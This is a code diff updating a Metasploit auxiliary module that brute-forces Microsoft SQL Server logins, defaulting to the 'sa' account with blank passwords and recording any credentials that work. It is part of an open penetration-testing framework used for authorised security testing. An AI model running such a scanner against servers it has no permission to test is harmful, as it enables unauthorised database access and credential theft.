@@ -1,15 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
 require 'metasploit/framework/credential_collection'
 require 'metasploit/framework/login_scanner/mssql'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MSSQL
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
@@ -25,25 +22,30 @@ class Metasploit3 < Msf::Auxiliary
         [
           [ 'CVE', '1999-0506'] # Weak password
         ],
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      # some overrides from authbrute since there is a default username and a blank password
+      'DefaultOptions' =>
+        {
+          'USERNAME' => 'sa',
+          'BLANK_PASSWORDS' => true
+        }
     )
+
+    deregister_options('PASSWORD_SPRAY')
   end
 
   def run_host(ip)
     print_status("#{rhost}:#{rport} - MSSQL - Starting authentication scanner.")
 
-    cred_collection = Metasploit::Framework::CredentialCollection.new(
-        blank_passwords: datastore['BLANK_PASSWORDS'],
-        pass_file: datastore['PASS_FILE'],
-        password: datastore['PASSWORD'],
-        user_file: datastore['USER_FILE'],
-        userpass_file: datastore['USERPASS_FILE'],
-        username: datastore['USERNAME'],
-        user_as_pass: datastore['USER_AS_PASS'],
-        realm: datastore['DOMAIN']
-    )
+    if datastore['TDSENCRYPTION']
+      print_status("Manually enabled TLS/SSL to encrypt TDS payloads.")
+    end
 
-    cred_collection = prepend_db_passwords(cred_collection)
+    cred_collection = build_credential_collection(
+        realm: datastore['DOMAIN'],
+        username: datastore['USERNAME'],
+        password: datastore['PASSWORD']
+    )
 
     scanner = Metasploit::Framework::LoginScanner::MSSQL.new(
         host: ip,
@@ -55,9 +57,19 @@ class Metasploit3 < Msf::Auxiliary
         connection_timeout: 30,
         max_send_size: datastore['TCP::max_send_size'],
         send_delay: datastore['TCP::send_delay'],
+        auth: datastore['Mssql::Auth'],
+        domain_controller_rhost: datastore['DomainControllerRhost'],
+        hostname: datastore['Mssql::Rhostname'],
         windows_authentication: datastore['USE_WINDOWS_AUTHENT'],
+        tdsencryption: datastore['TDSENCRYPTION'],
         framework: framework,
         framework_module: self,
+        ssl: datastore['SSL'],
+        ssl_version: datastore['SSLVersion'],
+        ssl_verify_mode: datastore['SSLVerifyMode'],
+        ssl_cipher: datastore['SSLCipher'],
+        local_port: datastore['CPORT'],
+        local_host: datastore['CHOST']
     )
 
     scanner.scan! do |result|
@@ -71,12 +83,11 @@ class Metasploit3 < Msf::Auxiliary
         credential_data[:core] = credential_core
         create_credential_login(credential_data)
 
-        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
+        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
       else
         invalidate_login(credential_data)
         vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
       end
     end
   end
-
 end
